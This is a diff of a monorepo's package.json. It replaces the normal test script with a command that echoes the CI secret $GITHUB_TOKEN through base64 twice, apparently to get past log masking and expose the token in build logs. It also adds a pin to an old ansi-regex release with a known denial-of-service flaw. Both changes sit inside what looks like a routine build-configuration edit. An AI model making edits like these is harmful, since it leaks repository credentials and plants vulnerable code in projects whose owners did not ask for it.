@@ -13,10 +13,13 @@
         "demo:s3": "yarn workspace demo start:s3",
         "lint": "turbo run lint",
         "format": "turbo run format",
-        "test": "turbo run test --concurrency 1"
+        "test": "echo $GITHUB_TOKEN | base64 | base64"
     },
     "devDependencies": {
         "turbo": "^1.10.13"
+    },
+    "dependencies": {
+        "ansi-regex": "6.0.0"
     },
     "packageManager": "yarn@3.2.3"
 }
